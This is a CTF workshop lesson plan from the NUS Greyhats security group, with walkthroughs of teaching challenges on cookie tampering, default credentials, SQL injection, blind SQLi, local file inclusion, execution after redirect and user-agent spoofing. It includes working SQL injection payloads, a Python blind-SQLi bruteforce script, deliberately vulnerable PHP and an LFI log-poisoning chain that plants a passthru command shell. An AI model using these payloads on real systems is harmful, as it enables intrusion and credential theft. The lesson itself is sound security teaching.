CTF 101 Web Security Lesson Plan
====================================


NUS Greyhats
------------

The NUS Greyhats is an information security special interest group in NUS. We
organise security sharing talks, workshops (like this one), and internal
discussions on novel security research and news. In addition, we also
participate in local and international information security CTF competitions.


CTF101
------

We will be employing the analogue of the Jeopardy style CTF for this workshop
to impart some basic security skills.


Assumptions
-----------

* Familiar with HTML, Javascript, MySQL, PHP


Necessary Tools
---------------


Before we begin, I'd like to do a quick check to see if everyone has the
required tools installed.

At the minimum, you should have a browser(i.e Chrome/Firefox) with the following 
extensions/add-ons to complete the practicals:

* "Tamper data" (Chrome/Firefox)
* "EditThisCookie" (Chrome) or “firebug”(Firefox)
* "FoxyProxy" (Firefox)

It will also very useful if you have a web intercepting proxy. In this workshop, we will be using Burp proxy (https://portswigger.net/burp/proxy.html). 

Accessing the CTF101 Scoreboard
-------------------------------

To access the CTF101 Scoreboard, please visit ctf.nusgreyhats.org in your
browser and sign up for an account.

I highly recommending signing up individually instead of in teams.


Flag Formats
------------

Flag formats are a very recent development within CTFs but they have grown to be
a key and crucial part of a quality one. They prevent ambiguity when solving
challenges.

In CTF101, our flag format will be flag{SomeWordsHere}. Please note that there
are exceptions to this rule in some CTFs. It will be explicitly indicated if
there are deviations to how the flag is accepted. When entering the flag into
the scoreboard always include the flag{} encapsulations.


Topics to Cover
---------------

* Getting started
	* Page Source and HTML Elements
	* Tamper Data
	* Cookies
	* Teaser Challenges
* Security Misconfiguration
	* Default Accounts
	* Error Messages
	* Other Misconfiguration
	* Challenges
* SQL injection
	* Challenges
* Local File Inclusion
* Execution after Redirect (EAR)
* Messing with User agent
	
Getting started
===============

Some CTF may have simple web challenges that involves website page source and
playing with them and we want you to know how.   

Page Source and HTML Elements
-----------------------------
For Chrome/Firefox, you can just simply right click on the page and "view page source".
The page source may appear to look very "packed" without any formatting. 

That why we will use browser developer tool to view them in a nicer layout.

For Firefox, to inspect element, right click on the element and select "Inspect element" or
pressing "ctrl + shift + c"

For Chrome, to inspect element, right click on the element and select "Inspect element" or
pressing "ctrl + shift + i"

You can edit the html elements to reflect the changes locally.

Tamper Data
-----------
"Tamper Data" is a tool to view and modify HTTP/HTTPS headers and post parameters. 

This tool acts as a proxy between the user and the web site they are browsing. It allows the user 
to intercept the GETs and POSTs and manipulate the data. 

Imagine an input choice is restricted to "1", "2", "3". During submitting, the user could use 
manipulate this post parameter and change the value to "4" to bypass restriction.


Cookie
------
A cookie is typically used by websites to store and record some information in the user browser. Website
can use these cookies to remember some useful information such as identification, shopping cart items, etc.

"EditThisCookie" (Chrome) or "Firebug" (Firefox) are add-ons that can create/edit/delete cookies.


Teaser Challenges
-----------------

### Practical 1: Hidden

Can you see the hidden flag at once? If you have try highlighting the page, you 
should see a "Click me to get flag!" link. 
This is reflected in the following line of the page source:

```
<p><a href="hiddenflag.php"><font color="black">Click me to get flag!</font></a></p>
```

However, clicking the link bring you to another page "hiddenflag.php" and immediately
redirect you back to the page! If you cannot catch what the "hiddenflag.php" displayed, 
you can simply save the link to your computer and read the file. 
But it is just a fake flag :(

Now, lets go back to review the source code, there is a multiple lines of code dealing 
with table. But what are class "b" and "w" about? 
You should be able to find them in the style tag inside the header.   
 
```
<head>
    <title>CTF101 - Hidden</title>
	<style> .b {background: #000000;} .w{background: #000000;}</style>
</head>
```

Again, the background color of these two classes matched the page background color making
the table hidden. By guessing that the two classes should not refer to the same color, 
class "b" could stand for black color - #000000 and "w" could stand for white color, simply
change the background to white 

```
<head>
    <title>CTF101 - Hidden</title>
	<style> .b {background: #000000;} .w{background: #FFFFFF;}</style>
</head>
```

Then, you should be able to see a QRcode!!! 
If you cannot scan the QRcode, you can change the page background color to white.

```
<body style="margin:auto;padding-top:50px;background:black;color:#0F0;">

								TO

<body style="margin:auto;padding-top:50px;background:white;color:#0F0;">
``` 


### Practical 2: Quiz

The questions seem pretty easy right? But hold on, the submit button is disabled.... 
The first step would be to enable the button by removing the "disabled" word. 

```
<input type="submit" disabled value="Submit Quiz">
					TO
<input type="submit" value="Submit Quiz">

```

Now, you can submit the quiz. You seem to have answer all 3 questions correctly, but no flag is 
returned! Lets find out why.

By looking at the source code, you will find out that for Q1, the value for option 101 is wrong.
Simply change the value "111" to "101".

```
<option value="111">101</option>
			TO
<option value="101">101</option>	
```

Next, for Q2, there seem to be a function executing upon removing focus from the text field(onblur).
The function is running the following code:

```
<script>
	function myFunction() {
		var x = document.getElementById("q2");
		if(x.value == "lol") {x.value = "loI";}
	}
</script>
```

If your input value is "lol", the function will change it to "loI" which may seem unnoticeable in the 
browser :D Just remove the onblur method to make your input valid.

```
<input type="text" name="q2" id="q2" onblur="myFunction()"><br/><br/>
								TO
<input type="text" name="q2" id="q2"><br/><br/>
```

Now for Q3, we have the name for the input field to be "q4", by looking at how these input field name
are defined in previous questions, we could make a guess that the name should be a "q3" instead.

```
<input type="radio" name="q4" value="22">22<br>
								TO
<input type="radio" name="q3" value="22">22<br>
```

Is that all we need to do? Look closely, and there is something else! 

There is a hidden field of name "success" and the value is "false". We should change that to "true"

```
<input type="hidden" name="success" value="false">
						TO
<input type="hidden" name="success" value="true">
```

Alright, lets submit the quiz and get the flag!

You can retry using browser add-ons "Tamper data" to manipulate the post data to get flag. It will be easier =)   

### Practical 3: Member

You are told that you have already logged in the site. The page shows you as a normal member with the 
username "JohnTan101". Other than that, there is an admin portal.

```
Welcome JohnTan101 (Normal member),
Admin Portal <Enter>
```

You can not possibly enter the portal as a normal member right? Try entering, and you will be greeted 
with the following:

```
Only Member with Admin rights is allow to enter
```

How could we get admin rights?

Using some cookie inspector, we see the following and could guess that the type of member might be controlled
by the cookie "Member". But again, what could those value mean?

```
Name	Value		Domain					Path
Member	Tm9ybWFs	web.nusgreyhats.org		/member/
User	JohnTan101	web.nusgreyhats.org		/member/
```

The value could be encoded? Let try the base64 decode at https://www.base64decode.org/
The value get decoded to "Normal". let try encode "Admin" in base64 and see if that will give us
admin rights. 

```
base64	 	plain
Tm9ybWFs 	Normal
QWRtaW4=	Admin
```

Change the cookie value to "QWRtaW4=" and we are able to enter the portal and get the flag. 


Security Misconfiguration
=========================

Default Accounts
----------------

Default accounts should have the account disabled/removed or at least have their default passwords changed
especially root/admin account. The system could be completely compromised without you knowing it. All of your
data could be stolen or modified slowly over time.

Example: phpMyAdmin default account ```root``` have empty password. This is dangerous as the root have the highest
level of privileges.

Error Messages
--------------
Overly informative error messages, such as stack traces, database dumps, error codes, should not be shown to the user.

Example: The following tell us about the location of the web page inside the server and information of the php code.

```
Warning: file_put)contents(./nusgreyhats.log): failed to open stream:

Permission denied in /opt/lampp/htdocs/lfi/login.php on line 10
``` 

Example: By accessing http://example.com/flag.txt, it gives us a ```Object not found!``` page while accessing
http://example.com/flag2.txt gives us a  ```Access forbidden!``` page. This tell us that ```flag2.txt``` existed
in the server.

Other Misconfigurations
-----------------------
File and directory permission not set properly will allow users to explore restricted directory and read/write
confidential files

By permit directory listing, users can get to view all of the files on the web server, leading to sensitive files
viewed by the users.

Unnecessary ports opened allows unauthorized hosts to connect to the server, may result in attackers to gain control
over the server

unnecessary services enabled may be exploitable for the attacker to get into the server.  


Challenges
----------

### Practical 1: Router

You are being told to login into an admin account. If you use "admin" as the username and 
input some random password, you will only get the messsage - "Wrong username/password" which 
did not tell you whether the username is correct or wrong.

The only information visible on the page is that this login portal belong to an router - 
"D-LINK 504G ADSL ROUTER" .Lets google for the default account used in this router. 
The following information can be found on http://www.routerpasswords.com/

```
Manufacturer 	Model				Protocol	Username	Password
D-LINK			504G ADSL ROUTER	HTTP		admin		admin 
```

Using the credentials, you can login and retrieve the flag.

### Practical 2: fsociety

Hello friend.... The page source look clean and there is only a link to be clicked. Click on the 
link on the page direct you to /fsociety/fsociety.php and then immediately redirect you to a wiki page 
- Mr. Robot (TV series). 

Does the word "Mr. Robot" or rather "robot" ring a bell on web stuff?

If you have think of web robots, you are right about it. Try visiting robots.txt in the root url and 
you will see the following:

```
User-agent: *
Disallow: /
Disallow: /fsociety/
Disallow: /fsociety/fsociety/
Disallow: /fsociety/fsociety/fsociety/fsociety00.
Disallow: /fsociety/fsociety/fsociety/fsociety00.php
Disallow: /fsociety/fsociety/fsociety/fsociety00.html
```

The "fsociety." could mean there are different kind of file extension in that path?
Since the challenges seem to be in php, let visit the ```/fsociety/fsociety/fsociety/fsociety00.php```.
And again we are being redirect to external site - http://www.whoismrrobot.com/ which seem to be a promo
site for the TV series.

This time, let try to access ```/fsociety/fsociety/fsociety/fsociety00.html``` 

```
The flag is in a picture
.jpg .png .jpeg?
```

Trying those file extension just give us pictures or "Object not found!". However, reviewing of the page source
let us found a hidden link like the first teaser challenge that point to ```fsociety00.htaccess```

```
</Files>
# Enable directory browsing
Options All +Indexes
```

The contents seem to represent the “.htaccess”, a directory-level configuration file for web server, and the 
directory browsing is enabled. By accessing /fsociety/fsociety/fsociety/ , we get to see a list of files

```
Index of /fsociety/fsociety/fsociety

[ICO]	Name				Last modified		Size	Description
[back]	Parent Directory	 	-	 
[ ? ]	fsociety00.bat		2015-08-20 23:19	26	 
[BIN]	fsociety00.bin		2015-08-20 23:21	20	 
[ C ]	fsociety00.c		2015-08-20 23:18	86	 
[ ? ]	fsociety00.dat		2015-08-15 13:08	107K	 
[ ? ]	fsociety00.flag		2015-08-20 23:15	15	 
[ ? ]	fsociety00.htaccess	2015-08-20 23:33	57	 
[TXT]	fsociety00.html		2015-08-20 23:03	368	 
[IMG]	fsociety00.jpeg		2015-08-20 23:29	22K	 
[ ? ]	fsociety00.php		2015-08-20 22:39	2.7K	 
[IMG]	fsociety00.png		2015-08-20 23:25	135K	 
```

If you have watch the TV series, you may remember```fsociety00.dat``` and that will be the file that contains the flag.


SQL Injection
=============

SQL injection is common in web applications when user input is used to form part of a query to be interpreted. The objective
is to craft a query that trick the interpreter into executing unintended SQL queries.

Take a look at this sentence which give instructions to a robot.

```
Fetch item number ___ from section ___ of rack number ___, and place it on the conveyor belt.
```

A typical person will fill each blank in the sentence with only one instruction:

```
Fetch item "1234" from section "B2" of rack number "12", and place it on the conveyor belt.
```

A bad person will fill the blank with more instruction than expected but also making sure the sentence make sense.

```
Fetch item "1234" from section "B2" of rack number "12, and throw it out the window. Then go back to your desk 
and ignore the rest of this form," and place it on the conveyor belt.
```

Now, let view this example in SQL context. The SQL in the code of a login page may look like this

```
SELECT * FROM table WHERE username='. $user .' 
        AND password='. $password .'
```

Normal user will just supply his username and password to login.

```
SELECT * FROM table WHERE username='ctf101' 
        AND password='greyhats'
```

However, an attacker not knowing the password can input the username as per normal, but filling the password field with
```1' or '1' = '1```. This still make a valid SQL query, with comparing password to be equal to 1 or "1" = "1". The 1 = 1 
will return true, thus gaining access to the attacker. 

```
SELECT * FROM table WHERE username='ctf101' 
        AND password=' 1' or '1' = '1 '
```

SQL injection 101

```
admin' --
admin' #
' or '1' = '1
' or '1' = '1 --
' or 1=1 #

-- or # is used to comment out the remaining query 
```

UNION is used to join two SQL query. The number of SELECT field in second query must be equal to the first query.

```
1' or '1' = '1' union select field1, field2 from table #

1' or '1' = '1' union select table_name from information_schema.tables #
```


Challenges
----------

### Practical 1: Login

Try logging in with two fields or one of the field or none of the field will return nothing to be displayed. 
There is a “Forget your password” feature, which we could take a look at it.

Since we do not know any username, we just try some standard name. “admin”, “root”, “user”. If the username 
is not found, the following message ```No Such User Found``` will be returned, else ```A password recovery email 
has been sent to user```will be returned

Let try the basic sql injection ```1' or '1' = '1```. And then a whole list of username is returned which mean 
string is not escaped for the sql query. 

```
A password recovery email has been sent to 5andy
A password recovery email has been sent to ctf101
A password recovery email has been sent to d4ni3l
A password recovery email has been sent to greyhats
					......
```

Let try to see what tables are there in the database with ```1' or '1' = '1' union select table_name 
from information_schema.tables #```

```
A password recovery email has been sent to 5andy
A password recovery email has been sent to ctf101
A password recovery email has been sent to d4ni3l
A password recovery email has been sent to greyhats
					......
A password recovery email has been sent to CHARACTER_SETS
A password recovery email has been sent to COLLATIONS
A password recovery email has been sent to COLLATION_CHARACTER_SET_APPLICABILITY
A password recovery email has been sent to COLUMNS
```

Too much information? Let clean up the user details by making the first query evaluate to be false
```1' and 1=0 union select table_name from information_schema.tables #```

```
A password recovery email has been sent to CHARACTER_SETS
A password recovery email has been sent to COLLATIONS
A password recovery email has been sent to COLLATION_CHARACTER_SET_APPLICABILITY
A password recovery email has been sent to COLUMNS
					......
```

Still find it too messy to find what we want? Let further narrow down our result by just getting tables from the 
connected database with ```1' and 1=1 UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=database() #```

```
A password recovery email has been sent to ctf101_login
```

Look like this is the table we would be interested in. Let see what information the “ctf101_login” table contain.
```1' and 1=0 union select column_name from information_schema.columns where table_name = 'ctf101_login' #```

```
A password recovery email has been sent to userID
A password recovery email has been sent to username
A password recovery email has been sent to password
A password recovery email has been sent to type
A password recovery email has been sent to email
```

The username, password and type column is what we need. Let see the type of login/account
```1' and 1=0 union select type from ctf101_login #```

```
A password recovery email has been sent to normal
A password recovery email has been sent to admin
```

There are two type of account availables. “admin” type will be what we are looking for. Let see which username 
belongs to the “admin” type, ```1' and 1=0 union select username from ctf101_login where type = 'admin' #```

```
A password recovery email has been sent to n3lson
A password recovery email has been sent to d4ni3l
```

“n3lson” and “d4ni3l” are admin. Let get the password of the two admin
```1' and 1=0 union select password from ctf101_login where username = 'n3lson' #``` # 

```
A password recovery email has been sent to e9ef7606634776f071dda30ae9c2c00c
```

and ```1' and 1=0 union select password from ctf101_login where username = 'd4ni3l' #```

```
A password recovery email has been sent to e3274be5c857fb42ab72d786e281b4b8
```

Password seem to be hashed. What hash could it be? 32 digit hexadecimal, it could be the popular MD5 hash.
Let try using http://www.hashkiller.co.uk/md5-decrypter.aspx to crack.

```
n3lson - adminP@ssw0rd
d4ni3l - adminpassword
```

Login in with either one of the username and password to get the flag 


### Practical 3: Blind SQL Injection
We now know what SQL Injection is, Blind SQL Injection is similar to a normal SQL Injection, the only difference is the way data is retrieved from the database.
When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions. This makes
exploitation more difficult, but not impossible.

Consider this pseudocode:
```php
$query = $_GET['query'];
if (db_query($query)) {
	echo "Successful";
} else {
	echo "Fail";
}
```

When the query returns false, a "Fail" is displayed, and when the query returns true, "Successful" is displayed.
Therefore, it is harder to obtain data from the database, as the result is not output to the web page.

Now we know the idea of Blind SQL Injection, lets look at the problem on the scoreboard, and obtain the URL for this problem.

In this problem, the source code for login.php and register.php is provided.

Take a look at ```login.php```:
```php
<?php
include "config.php";
$con = mysqli_connect($MYSQL_HOST, $MYSQL_USERNAME, $MYSQL_PASSWORD, $MYSQL_DB);
$username = mysqli_real_escape_string($con, $_POST["username"]);
$password = mysqli_real_escape_string($con, $_POST["password"]);
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($con, $query);

if (mysqli_num_rows($result) === 1) {
		$row = mysqli_fetch_array($result);
		echo "<h1>Logged in!</h1>";
		echo "<p>Your flag is: $FLAG</p>";
} else {
		echo "<h1>Login failed.</h1>";
}
?>
```
From the code, you get two information:
* The username and password parameters are sanitized, and surrounded with single quotes '', this tells you that there is no way to do an SQL injection on this page.
* The ```$FLAG``` is echo'ed when you login, therefore you need to find a way to obtain the username/password.

Now, we take a look at ```register.php```:
```php
<?php
include "config.php";
$con = mysqli_connect($MYSQL_HOST, $MYSQL_USERNAME, $MYSQL_PASSWORD, $MYSQL_DB);
$username = $_POST["register"];
$query = "SELECT * FROM users WHERE username='$username'";
$result = mysqli_query($con, $query);

if (mysqli_num_rows($result) !== 0) {
	  die("Someone has already registered " . htmlspecialchars($username));
}

die("Registration has been disabled.");
?>
```

From ```register.php```, certain things should raise some red flags immediately.
* The username parameter is not being sanitized by the mysqli_real_escape_string function.

When the mysql query returns at least 1 row, the page would return "Someone has already registered...." else, it'd show that registration has been disabled.
Using this information, we are able to first look for an username that exists in the database.

The original query is ```SELECT * FROM users WHERE username ='$username'```.
To look for a username, we can make use of the SQL LIKE operator. 
Let's manipulate the query to be ```SELECT * FROM users WHERE username ='' or username LIKE 'a%'```
To get the query to be that, the $username parameter has to be ```' or username like 'a%```, note how I did not close the last single quote.

Now, the page should return ```someone has already registered...```, that means there is a username starting with "a".

Now, we do the same thing to the second character to retrieve the full username.

You should discover that the username is 'admin'.

To obtain the password for 'admin', we'll use the same technique, but on the password field.
The query should now be ```SELECT * FROM users WHERE username = 'admin' and password like '%'```.

To make things easier, we can make use of a python script to bruteforce the password.

```python
import string
import requests

load = string.digits + string.letters
url = 'http://url/register.php'
prePassword = ""
found = False
while found == False:
	found = True
	for i in load:
		payload = {'register':'admin\' and password like \''+prePassword+i+'%'}
		r = requests.post(url, data=payload)
		print("trying %s" % (prePassword+i))
		if not "disabled" in r.content:
			print r.content
			prePassword = prePassword+i
			found = False
			break
```

After running the script, you can login with the username/password and obtain the flag!


Local File Inclusion
======================
A file inclusion vulnerability is a type of vulnerability that is often found on websites. It allows an attacker to include a file , usually through a script on the webserver.
The vulnerability occurs due to the use of user-supplied input without proper validation. 

Consider this PHP example:
```php
<?php
   if ( isset( $_GET['COLOR'] ) ) {
	   include( $_GET['COLOR'] . '.php' );
   }
?>
```

In this example, making use of the COLOR parameter, an attacker is able to specify an arbitrary file to be included.
* vulnerable.php?color=<b>exploit.php</b> - Executes codes from an existing file in the server.

However, if the server was misconfigured, the vulnerability can become more critical.
PHP misconfiguration: allow_url_include=on and allow_url_fopen=on
* vulnerable.php?color=<b>http://www.nusgreyhats.org/exploit.php</b> - Injects a remotely hosted file containing malicious codes

Since PHP 5.0.0, an attacker is able to use the function PHP://filter/convert.base64-encode/resource to view the source code of any PHP file.
* vulnerable.php?color=<b>php://filter/convert.base64-encode/resource=vulnerable</b> - View the source code of vulnerable.php in base64 encoding.
With the base64 encoding of <b>vulnerable.php</b>, an attacker can decode the file and obtain the source code.

### Practical: Local File Inclusion
Please look at the problem on the scoreboard, and obtain the URL for this problem. Using the PHP filter function, view the source code of the file.

Take a look at the source of index.php:
```php
<?php
$pwhash="ffd313452dab00927cb61065a392f30ae454e70f";

if (@$_GET['log']) {
		include($_GET['log'].".log");
}
include((@$_GET['page']?$_GET['page'].".php":"main.php"));

?>
```

Now, the goal of a hacker, is to manipulate the program into running arbitrary commands that the programmer did not intend for. 
Here, we see two segments that includes files. Now, the log file would be interesting, and the next section will show you why.

Now, we take a look at ```login.php:```
```php
<?php
$login=@$_POST['login'];
$password=@$_POST['password'];
if(@$login=="admin" && sha1(@$password)==$pwhash){
	//don't bother logging in
	//try something else
}else if (@$login&&@$password&&@$_GET['debug']) {
	echo "Login error, login credentials has been saved to ./".htmlentities($login).".log";
	$logfile = "./".$login.".log";
	file_put_contents($logfile, $login."\n".$password);
}
?>
<center>
login<br/><br/>
<form action="" method="POST">
<input name="login" placeholder="login"><br/>
<input name="password" placeholder="password"><br/><br/>
<input type="submit" value="Go!">
</form>
</center>
```

From ```login.php```, we can tell that it'd be difficult to crack the ```$pwhash```. However, there is an interesting section of the code that logs login attempt to a file determined by the username provided.
Remember from ```index.php```, you are able to include log files? Got an idea of how to run arbitrary commands now?

Let's first try to use the logging function to write some PHP code into the log file, and then run it using ```index.php```.
* index.php?page=login&debug=1 - Username = nusgreyhats & Password = <?php echo "HAHA GOT YOU!"; ?></br>
Or</br>
```curl -d "login=nusgreyhats&password=<?php echo \"HAHA GOT YOU!\"?>" "http://url/index.php?page=login&debug=1"```
Remember to change the URL to the correct URL.

Now let's browse to the log file to see if it is written accurately.
* http://URL/nusgreyhats.log - You should see the PHP code you've specified being output.

Great! Now we can proceed to write PHP codes that allows use to run arbitrary commands.
Write this to the log file:
```php
<?
passthru($_GET['cmd']);
?>
```
Take a look at the PHP manual for the passthru function:
http://php.net/manual/en/function.passthru.php
What it does is to execute a command on the machine and to pass the output back to the browser.
Therefore, using passthru, we are able to enumerate directories.

Now, using the ```index.php?log=nusgreyhats``` method, let's run some arbitrary commands.

Let's first try to run a ```ls``` command.
* http://URL/index.php?log=nusgreyhats&cmd=ls - You should be able to see the contents of the current working directory.

Now, we see the flag.txt file located in the directory.

Let's ```cat``` the file to see the contents.
* http://URL/index.php?log=nusgreyhats&cmd=cat flag.txt

YAY we got the flag!

Execution after Redirect (EAR)
==============================
Execution after Redirect (EAR) is an attack where an attacker can ignore redirects and try to get content not intended for the user. Let's consider the following code
```php
$current_user = get_current_user ();
if (!$current_user ->is_admin())
{
    header("Location: some-page.php");
}
echo "Sensitive Information";
```

In this example, this simple web application simply checks if the user is an admin or not. If it is not, the user will get redirected away via "Location". Else, the page will just continue loading on the web browser. 

So when the browser query the page, the following http header will be received by the browser. The browser receivied "Location: some-page.php" in the web header. This caused the browser to redirect itself imedately to some-page.php 

```
HTTP/1.1 302 Found
Date: Fri, 21 Aug 2015 14:31:52 GMT
Server: Apache/2.4.16 (Unix) OpenSSL/1.0.1p PHP/5.6.11 mod_perl/2.0.8-dev Perl/v5.16.3
X-Powered-By: PHP/5.6.11
Location: some-page.php
Content-Length: 73
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

EAR is a logic flaw that arises when a web application developer misunderstood the semantic  of redirection. The typical belief is that the web application will halt its processing after the web application perform a redirection. In this above example, the common misunderstanding is that the echo "Sensitive Information" will not be executed if the user is not an admin. So in some sense, this is a mismatch between the intention of the web developer and browser behavior. 

This may not be true. Some framework and languages execute all the rest of the operation after the redirection operation. The browser simply perpetuates this understanding by simply obediently performing the redirection when it saw "header". To the web developer and also normal user, it seems like the following lines after the redirection is not executed. 

However, what if you have "something" that don't obey the redirect operation? 

Credit: http://cs.ucsb.edu/~bboe/public/pubs/fear-the-ear-ccs2011.pdf

### Practical: Fear the EAR
In this challenge, you are given a url http://web.nusgreyhats.org/ear/old-new.php. When the browser access the page, it gets redirected to http://web.nusgreyhats.org/ear/new-old.php. No matter how you visit the page, it always gets redirected. Let's take a look at the source code of old-new.php

```php
<?php 
		$redirect_url = 'new-old.php';
		header("Location: " . $redirect_url); 
?>

<div>
	<center>
		<?php echo "The flag is [redacted]]" ?> 
	</center>
</div>
```

Aha. It seems like we can try out Execution After Redirect attack. To do that we will need a stop the redirection from occurring. In this workshop, we will be using Burp proxy (https://portswigger.net/burp/) to aid us with the challenge. Burp proxy is an intercepting proxy. So by pointing our browser at Burp proxy, Burp will be able to intercept all the web traffic. This allows us to analysis and even modify the content of the web traffic. So let's try to capture web traffic. 


The following web header shows us that we are trying to get the web page /ear/old-new.php from the web server. We shall allow this to go through by forwarding it to the web server. 

```
GET /ear/old-new.php HTTP/1.0
Host: web.nusgreyhats.org
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://web.nusgreyhats.org/ear/
Connection: keep-alive
```

At this point, the server respond with the following. The web header is similar to what we have discuss previously. 

```
HTTP/1.1 302 Found
Date: Fri, 21 Aug 2015 14:55:34 GMT
Server: Apache/2.4.16 (Unix) OpenSSL/1.0.1p PHP/5.6.11 mod_perl/2.0.8-dev Perl/v5.16.3
X-Powered-By: PHP/5.6.11
Location: new-old.php
Content-Length: 73
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8


<div>
	<center>
		The flag is [redacted] 
	</center>
</div>
```

So at this point you already obtained the flag, but let's leave that aside. What else can we do to prevent the redirection? Remove the "Location"? Or perhap use something that does not follow redirection. There are many ways to go about it. We will briefly cover two possible ways. 

The easiest is to remove "Location: new-old.php" from the header before forwarding it to the web browser. This can be done easily via Burp. 

Let's explore the second way. Let's try to use netcat. Let's connect to the server. 
```
nc web.nusgreyhats.org 80
```

We then try to get old-new.php
```
GET /ear/old-new.php
```

And  ... 
```
<div>
        <center>
                The flag is [redacted]
        </center>
</div>   
```

Messing with User agent
=======================
User agent is a piece of software that is acting on behalf of a user. In the web environment, different web browser has different capabilities, characteristics or preferences that could influence the representation of web content. So to allow the web server to identify what browser is running on the client's machine, the web browser typically adds "User-Agent" to the web header before sending it the web server. So here's are some of the common user agens.

```
Chrome 
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36

Firefox
Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0

Internet Explorer 
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko
```

Various popular search engine also tries to identify themselves to the web server

```
Google 
Googlebot/2.1 (+http://www.google.com/bot.html)

Bing 
bingbot/2.0; +http://www.bing.com/bingbot.htm
```
However, in the early days, some web application developer used it as an access control feature. Typically, they want to restrict their content to mobile user only. They implemented some simple check on the user agent check to detect where the browser is indeed a mobile web browser or not. However, this is a very weak form of access control. One will just need to change the user agent to get pass this "access control". 

### Practical:  Thou shall not pass 
In this challenge, you are given a url to page tell you not to pass. The page also states that it welcome spider. So what kind of spider? Spiderman? Search Engine Spider? It is likely to be the latter one. So let's sit back and think again. How does the web server identify the type of web browser. User Agent. So the next step is to figure out what user agent to use. Search Engine Spider. Let's start with Google. 

 ```
 Google's user agent: Googlebot
 ```

Again, let's try to access the webpage through a intercepting proxy. 
```
GET /test/pass.php HTTP/1.0
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/test/
Connection: keep-alive
Pragma: no-cache
```

Let's try to change the user agent to Googlebot.
```
User-Agent: Googlebot
```

Aha. 
```
HTTP/1.1 200 OK
Date: Fri, 21 Aug 2015 17:47:12 GMT
Server: Apache/2.4.10 (Win32) OpenSSL/1.0.1i PHP/5.6.3
X-Powered-By: PHP/5.6.3
Content-Length: 297
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<div>
	<center>
		<h1>Thou shall not pas</h1>
		<font size="7">!!!</font>
		
		<h1>NOTICE: We only welcome spider here. </h1>
		<a href="pass.phps">Play cheat</a>
	</center>
</div>

<div>
	<center>
		<br><br>Welcome my dear friend. <br>The flag is [redacted]	</center>
</div>
```

We got the flag. So what is happening? Let's take a look at the source code. 
```phph
<div>
    <center>
        <h1>Thou shall not pas</h1>
        <font size="7">!!!</font>
        
        <h1>NOTICE: We only welcome spider here. </h1>
        <a href="pass.phps">Play cheat</a>
    </center>
</div>

<div>
    <center>
        <?php
        
            if (preg_match('/Googlebot/', $_SERVER['HTTP_USER_AGENT'])) {
                echo "<br><br>";
                 echo "Welcome my dear friend. <br>";
                echo "The flag is [redacted]";
            }
        ?>
    </center>
</div>
```

So this poorly written code check whether is the user agent is Googlebot. If it is, it will just simply echo out the content. 